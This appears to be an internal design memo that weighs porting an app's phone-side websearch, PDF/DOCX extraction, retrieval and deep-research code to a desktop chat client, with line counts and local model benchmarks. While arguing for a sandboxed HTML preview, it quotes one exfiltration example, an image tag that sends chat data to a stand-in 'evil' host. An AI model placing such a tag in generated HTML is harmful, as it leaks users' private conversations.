# Websearch, documents, deep research, previews: what we already own

Question from the owner, 2026-09-17: what else can the desktop chat lift from the
open-source apps and from the phone — websearch, deep research, a right-hand panel
with an HTML preview and a file manager, and attachments (doc / PDF / ppt) the model
can actually work on?

The answer for three of those four is **not the open-source apps: the phone**. Every
line below was counted on disk in `/Users/marco/Projects/kalsa` today, not recalled.
`rn` = number of `react-native` / `expo` / `react` imports, i.e. how much of the file
is tied to the phone. Test files excluded from the counts.

## 1. Websearch with sources — 100% written, 758 of 983 lines portable as-is

| file | loc | rn |
|---|---|---|
| `src/search/ExaMCP.ts` | 261 | 0 |
| `src/search/index.ts` | 131 | 0 |
| `src/search/registry.ts` | 122 | 1 |
| `src/search/secretStore.ts` | 103 | 1 |
| `src/search/providers/brave.ts` | 94 | 0 |
| `src/search/providers/exaApi.ts` | 90 | 0 |
| `src/search/providers/tavily.ts` | 82 | 0 |
| `src/search/http.ts` | 57 | 0 |
| `src/search/SearchProvider.ts` | 43 | 0 |

Plus the tools that turn results into an answer with references, all RN-free:
`src/agent/webSearchTool.ts` (166), `src/agent/webFetchTool.ts` (**1442**),
`src/agent/toolSourceLedger.ts` (269 — citation numbering, tool-call dedup,
`buildCiteInstructionSuffix`).

The two files with one RN import each are `registry.ts` and `secretStore.ts`: the
import is the keychain / storage. On the desktop that is a file under the app's data
dir, or Tauri's store. It is an adapter, not a rewrite.

`webFetchTool.ts` is the expensive one to have written and it comes for free: fetch,
redirects, size caps, HTML → text. A desktop websearch that shows the sites as
references is the phone's pipeline with a different renderer.

## 2. Attachments — PDF, DOCX, TXT/MD today. PPTX/XLSX are not built.

Verified in `src/documents/documentKinds.ts:6`:

```ts
export type PickedDocKind = "pdf" | "txt" | "docx";
```

So the honest answer to "can we attach doc, PDF, ppt?" is: **doc and PDF yes, ppt no**
— but the missing piece is small. `src/documents/docxToText.ts` (180 loc, 0 rn) is a
pure extractor built on `fflate` (MIT, already a dependency). PPTX and XLSX are the
same OOXML zip container; the work is a different XML path (`ppt/slides/slideN.xml`,
`<a:t>` runs) inside machinery that already exists — not a new subsystem.

PDF: `src/util/pdfText.ts` (804 loc, **0 rn**) + `src/pdf/pdfTextService.ts` (319, 0)
+ `src/pdf/pdfCacheFs.ts` (50, 0) are portable. `src/pdf/PdfTextExtractorHost.tsx`
(131, 3 rn) is **not needed on the desktop**: its whole job is to mount a hidden
WebView so pdf.js can run on a phone, with a single-flight rule and a 185 s backstop
because "a phone can barely hold one PDF WebView + decoded page state in memory"
(`pdfTextService.ts:9-13`). The desktop app *is* the browser. pdfjs-dist is
Apache-2.0 (`node_modules/pdfjs-dist/LICENSE:1`), pinned at 3.11.174.

The port here is a **simplification**, which is rare and worth saying out loud.

## 3. "The AI can work on it" — that part is the retrieval, and it exists

An attachment is worthless if the model can only see the first 2000 characters.
`src/documents/DocumentLibrary.ts:321` decides, per document:

```ts
    est < 0.5 * ctx &&
    (!hasBudget || est <= budget)
  ) {
    return "full_context";
  }
  return "retrieve";
```

Two gates, not one: the document must fit in **half the context** *and* inside the
**prefill time budget** — `prefillBudgetTokens(modelId, MAX_FIRST_WORD_WAIT_MS, …)`
(`src/documents/documentChatStrategy.ts:35`). The second gate is a promise about how
long the user waits for the first word, and on a PC with a GPU it is far wider than on
a phone. Same code, better numbers.

When it does not fit, `src/documents/semanticIndex.ts` (587 loc, 0 rn) does hybrid
retrieval: BM25 + dense cosine fused with Reciprocal Rank Fusion, k=60
(`semanticIndex.ts:1-25`). Around it: `documentChatRetrieval.ts` (145),
`documentChatHybrid.ts` (150), `documentChatFullContext.ts` (50),
`documentChatExecutor.ts` (179), `extractionScope.ts` (82) — all 0 rn.

The one real dependency: embeddings. The phone runs multilingual-e5-small Q8_0,
384 dims, mean pooling, 132 MB (`src/engine/ModelRegistry.ts:313-332`) in a second
llama.rn context, and `src/engine/EmbeddingService.ts` is 864 lines of memory
co-residency, a native-op mutex and a hung-context policy — **all of it phone
problems**. On the desktop the same model is a second `llama-server` on its own port.
Verified on our shipped binary b10950:

```
--pooling {none,mean,cls,last,rank}     pooling type for embeddings
--embd-normalize N                      normalisation for embeddings (default: 2)
--embedding, --embeddings               restrict to only support embedding use case
```

So: `src/engine/embeddingPure.ts` (175, 0 rn) ports, the 864-line service is replaced
by an HTTP call, and 132 MB of RAM buys retrieval over documents of any size.

## 4. Deep research — built, but over the library, not the web

`src/research/deepResearch.ts` (404, 0 rn) + `src/research/plan.ts` (124, 0 rn).
Its header states the shape:

```
 * Plan (one completion) → retrieve per subquery → write (one completion) →
 * rewrite [[n]] citations. The 4B never owns the loop.
```

That last sentence is the design: the host owns the loop, the model only fills slots.
It is bounded — `DEEP_RESEARCH_DEADLINE_MS = 420_000`, `PASSAGE_BUDGET_CHARS = 6000`,
planner 256 tokens, writer 1000.

Today its source is the local document library. **Web deep research is the same loop
with `retrieveLibraryPassages` swapped for search + fetch** — and §1 already ships both
sides of that swap, including the citation ledger. It is a composition of parts we
own, not a new feature.

## 5. The right-hand panel — the one thing we do NOT have

The crescent carries six surfaces and no paging by design
(`crescent-chat/src/app/surfaces.ts:11-19`), and all six are already spoken for by the
brain's wizard: chat, models, server, devices, advanced, settings. So documents and
previews cannot be a seventh point — they belong in a panel on the right of the Chat
surface. The owner's instinct matches the constraint.

What the phone does instead of an HTML preview is worth knowing before we copy anyone:
it **never lets the model emit HTML**. `src/agent/createMiniappTool.ts:18-40` exposes
`create_miniapp` with `template` + `slots` from a fixed enum (compare_data,
quick_calculator, reading_quiz, kpi_strip, checklist, pros_cons), and the app renders
native components. Untrusted code is never executed because none is ever produced.

A real HTML preview is a different risk class: model-written HTML is untrusted code,
and one `<img src="https://evil/…?c=…">` in it exfiltrates the conversation from the
one product whose whole promise is that nothing leaves the PC. We already blocked
remote images in the chat for exactly that reason (crescent-chat round 18). If we do
previews, the sandbox is the feature — the rendering is trivial.

Which open-source app to lift the sandbox from is the open question, and it is out at
research now.

## 6. Totals

~7,300 lines of TypeScript, already written and already tested, answer three of the
four questions. Nothing here needs to be invented or copied from anyone:

| area | portable loc | needs an adapter | not needed on desktop |
|---|---|---|---|
| search + web tools | 2,635 | 225 (keychain) | — |
| documents + retrieval | 2,961 | 864 (EmbeddingService → HTTP) | 839 (RN storage + cover UI) |
| pdf | 1,173 | — | 131 (WebView host) |
| deep research | 528 | — | — |

The order of value, if we do them: websearch first (it is nearly free and the phone
already proves it), then attachments (PDF/DOCX with the existing strategy gate), then
the preview panel (which is a security design task, not a UI task), then web deep
research (which is the first two composed).

## 7. Correction: no embedding model, no RAG on the PC

The owner pushed back on §3 — "one thing is Kalsa on the phone, another is Kalsa on the
PC; does the embedding really serve? the user has to download more stuff" — and then
said what he actually wants: a nice file manager for Windows and macOS where you find
a file without going mad, one click attaches it, it stays in the AI's memory for that
conversation, plus a history of attachments. **No RAG.**

He is right, and the machine says so. Measured today on this Mac, Trinity-Nano
Q4_K_M (afmoe 6B), Metal, flash-attn on, `llama-bench -r 2`:

| prompt | prefill |
|---|---|
| pp2048 | 2136.53 ± 3.52 t/s |
| pp8192 | 1801.18 ± 0.15 t/s |
| pp16384 | 1586.08 ± 0.33 t/s |

16,384 tokens — roughly 30 dense pages — prefill in **10.3 seconds**, once. And the
memory it costs is smaller than expected, because Trinity is a sliding-window model.
From `llama-cli -c 16384 --cache-type-k q8_0 --cache-type-v q8_0 -v`:

```
llama_kv_cache: size =  119.00 MiB ( 16384 cells,  14 layers,  1/1 seqs), K (q8_0):   59.50 MiB, V (q8_0):   59.50 MiB
llama_kv_cache_iswa: creating     SWA KV cache, size = 2560 cells
llama_kv_cache: size =   55.78 MiB (  2560 cells,  42 layers,  1/1 seqs), K (q8_0):   27.89 MiB, V (q8_0):   27.89 MiB
```

Only **14 of 56 layers** hold the full window; the other 42 hold 2560 cells and do not
grow with the context. Total KV at 16k = **174.8 MiB**, plus 53.4 MiB of Metal compute
buffer. Raising the context mostly scales those 14 layers: ~64k costs about half a GiB.

So on a PC the document simply goes **into the context**, and the prompt cache keeps it
warm — the 10 seconds are paid once and every following question about that document
starts instantly (the cache is worth 21x with `--parallel 1`, measured 2026-09-16).
Retrieval exists to avoid a prefill the phone cannot afford. The PC can afford it.

What survives from §2–§3, then, is only the **extraction**:

- `src/util/pdfText.ts` (804, 0 rn) + `src/pdf/pdfTextService.ts` (319, 0 rn) — pdf.js,
  Apache-2.0, already pinned
- `src/documents/docxToText.ts` (180, 0 rn) — fflate, MIT, already a dependency
- `src/documents/documentKinds.ts` (113, 0 rn) — mime/extension sniffing
- pptx/xlsx: the same fflate path, a different XML file

What we do NOT port: `semanticIndex.ts` (587), `EmbeddingService.ts` (864),
`embeddingPure.ts` (175), `DocumentLibrary.ts` (531), the whole `documentChat*`
strategy family, and the 132 MB e5-small download. That is ~2,500 lines and one model
file the desktop does not need.

### The two things this design must not get wrong

1. **A document that does not fit must be said out loud, not truncated in silence.**
   Show pages and tokens at attach time and refuse clearly. A silent truncation makes
   the model answer confidently about a file it only half read — the worst failure this
   feature can have, and invisible to every green test.
2. **Attachments are pinned; chat turns are what gets dropped.** When the context fills,
   the oldest turns go first and the attached documents stay — otherwise the file
   silently leaves the conversation the user believes it is in.

The file manager itself is the genuinely new part: recent files, the three folders
people actually use, name search, one click to attach, and a per-conversation
attachment history. Not a library, not an index.
